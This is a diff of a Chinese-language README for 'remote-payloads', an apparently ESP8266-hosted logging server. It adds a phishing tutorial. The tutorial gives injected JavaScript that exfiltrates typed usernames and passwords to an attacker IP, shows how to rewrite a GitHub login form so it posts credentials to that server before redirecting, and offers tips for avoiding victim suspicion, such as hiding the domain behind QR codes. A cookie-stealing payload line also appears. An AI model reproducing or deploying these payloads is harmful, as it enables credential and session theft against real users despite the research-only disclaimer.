@@ -57,7 +57,7 @@ img.src = 'http://192.168.1.103/logs?cookie='+encodeURIComponent(document.cookie
 - remote_payloads_cli.ino
 - remote_payloads_cli.py
 
-其中remote_payloads_cli.ino在上传到esp8266之前，需要配置好用户名、密码和wifi基本信息（当然，你也可以修改端口等信息，只要你清楚自己在做什么就行），如下
+其中remote_payloads_cli.ino在上传到esp8266之前，需要配置好用户名、密码、隐藏目录和wifi基本信息（当然，你也可以修改端口等信息，只要你清楚自己在做什么就行），如下
 
 ![config.png](./img/config.png)
 
@@ -123,6 +123,80 @@ exit            log off and exit                exit
 ![NodeMCU](./img/NodeMCU.jpg)
 
 
+# Example
+
+## 用remote-payloads钓鱼
+
+### 剽窃式
+
+1. 先在本地用curl或wget命令获取你想要伪造的页面，remote-payloads也支持wget命令，但获取的页面有长度限制，且不易编辑。
+
+2. 在获取到的HTML文件中<head>标签下加入如下代码：
+
+```html
+<script>
+window.onload = function() {
+	function $(id) {
+		return document.getElementById(id)
+	}
+	function getInput(inputId){
+		$(inputId).onblur = function() {
+			var img = document.createElement('img');
+			img.width = 0;
+			img.height = 0;
+			img.src = 'http://192.168.1.100/logs?args='+$(inputId).name+': '+inputArea.value;
+		}
+	}
+	getInput(userName);
+	getInput(passwordInput); 
+}
+</script>
+
+```
+
+需要将代码中userName和passwordInput改为活添加为你想要获取的输入框Id，将http://192.168.1.100/换成你remote-paylaods的ip或域名
+
+3. 让用户访问该页面，则用户在你关注的输入框中输入的内容将会被发送到你的remote-paylaods并被记录下来
+
+![sanfengyun_1.png](./img/sanfengyun_1.png)
+
+
+缺点：	1.由于remote-paylaods是HTTP服务器，所以当伪造页面为HTTPS时，其输入框可能会提示“不安全连接”
+	2.表单会正确发送至原服务器，但跳转资源可能会跳转到remote-payloads的域名下，而非原服务器域名下，导致出现空白页面
+优点：	如果上述两个缺点条件都不成立，那么这将是一次“无痕”钓鱼【手动滑稽， 用户感受不到差别
+
+
+### 跳转式
+
+1. 先在本地用curl或wget命令获取你想要伪造的页面，remote-payloads也支持wget命令，但获取的页面有长度限制，且不易编辑。
+
+2. 在获取到的HTML文件中将表单<form>的action改为你remote-payloads的ip或域名+logs，然后添加一个隐藏input元素，如下：
+
+```html
+<!--将https://github.com/login页面的<form action="https://github.com/login" accept-charset="UTF-8" method="post">改为如下内容-->
+<form action="http://192.168.1.100/logs" accept-charset="UTF-8" method="post"><input type="hidden" name="toUrl" value="https://github.com/login" />
+```
+
+其中`name="toUrl"`是设定好了的，不能改换（除非你改源码）
+
+3. 当用户点击提交表单时，表单将提交至remote-paylaods，然后remote-payloads将返回`<script>window.location.replace(\"" + toUrl + "\")</script>`，页面将立即**‘变成’**toUrl网址，且不能通过返回操作至/logs页面
+
+![github_1.png](./img/github_1.png)
+
+缺点：	表单内容传给了remote-payloads，但没有传给原服务器，所以不能一次性通过身份验证，用户相当于需再次输入（不管之前是否输入正确）
+优点：	基本不会出现剽窃式缺点中的两种情况
+
+
+### 提示
+
+- 可以将两种方法结合起来，原则就是让用户察觉不到变化（太阴了bushi
+
+- 可以将链接转为二维码（(草料二维码)[https://cli.im]），用户一般只能用手机扫码，而手机是不会显示域名的（有点过了。。。
+
+
+# 免责声明
+
+**本仓库提供的内容可能带有攻击性，仅供研究学习使用，用户将其信息做其他用途，由用户承担全部法律及连带责任，本人不承担任何法律及连带责任。 **
 
 
 
